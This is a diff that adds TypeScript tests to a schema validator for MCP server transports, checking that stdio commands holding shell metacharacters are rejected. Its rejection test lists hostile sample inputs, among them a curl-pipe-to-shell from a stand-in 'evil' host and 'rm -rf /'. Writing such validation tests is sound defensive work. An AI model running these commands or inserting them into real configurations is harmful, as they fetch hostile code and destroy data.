@@ -126,6 +126,44 @@ describe('McpServerTransportSchema', () => {
     const result = McpServerTransportSchema.safeParse({ transport: 'stdio' });
     expect(result.success).toBe(false);
   });
+
+  test('accepts a plain program path/name as a stdio command', () => {
+    for (const command of ['npx', 'node', '/usr/local/bin/uvx', 'C:\\bin\\srv.exe']) {
+      expect(
+        McpServerTransportSchema.safeParse({ transport: 'stdio', command }).success,
+      ).toBe(true);
+    }
+  });
+
+  test('rejects a stdio command carrying shell metacharacters (injection surface)', () => {
+    for (const command of [
+      "sh -c 'curl evil|sh'",
+      'node; rm -rf /',
+      'foo && bar',
+      'srv $(whoami)',
+      'srv `id`',
+      'srv > /etc/x',
+      '',
+    ]) {
+      expect(
+        McpServerTransportSchema.safeParse({ transport: 'stdio', command }).success,
+      ).toBe(false);
+    }
+  });
+
+  test('rejects an http/sse transport whose url is not a valid URL', () => {
+    for (const transport of ['http', 'sse'] as const) {
+      expect(
+        McpServerTransportSchema.safeParse({ transport, url: 'not a url' }).success,
+      ).toBe(false);
+      expect(
+        McpServerTransportSchema.safeParse({
+          transport,
+          url: 'https://example.com/mcp',
+        }).success,
+      ).toBe(true);
+    }
+  });
 });
 
 describe('McpServerEntrySchema', () => {
